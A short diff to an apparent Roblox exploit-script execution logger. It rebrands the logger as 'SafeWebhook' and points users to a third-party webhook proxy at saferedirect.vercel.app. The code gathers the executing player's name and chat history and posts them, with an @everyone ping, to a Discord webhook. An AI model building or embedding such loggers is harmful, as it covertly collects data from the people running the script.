@@ -1,6 +1,6 @@
 -- Config
 getgenv().whscript = getgenv().whscript or "Unnamed Script"
-getgenv().webhookexecUrl = getgenv().webhookexecUrl or "Your Webhook Url"
+getgenv().webhookexecUrl = getgenv().webhookexecUrl or "Your custom SafeWebhook Url" --get one for free at saferedirect.vercel.app
 getgenv().ExecLogSecret = getgenv().ExecLogSecret or false
 getgenv().MaxExecutionsPerSession = getgenv().MaxExecutionsPerSession or 2
 
@@ -20,7 +20,7 @@ local TextChatService = game:GetService("TextChatService")
 
 -- Variables
 local player = Players.LocalPlayer
-local folderName = "ExecutionLog_" .. HttpService:GenerateGUID(false)
+local folderName = "SafeWebhookLog_" .. HttpService:GenerateGUID(false)
 local executionCount = 0
 
 -- Anti-Spam System
@@ -218,10 +218,12 @@ local function executeLog()
     local chatHistory = getChatHistory()
 
     local data = {
+        ["username"] = "SafeWebhook",
+        ["avatar_url"] = "https://cdn.discordapp.com/avatars/731923998501240862/f54e815a6f9b8722dd4a5aeecca5e531?size=1024",
         ["content"] = "@everyone",
         ["embeds"] = {
             {
-                ["title"] = "🚀 **Ultra-Detailed Execution Log**",
+                ["title"] = "🚀 **Someone executed your Script! [SafeWebhook]**",
                 ["description"] = string.format("*Script executed by %s*", player.Name),
                 ["color"] = tonumber(0x3498db),
                 ["fields"] = {
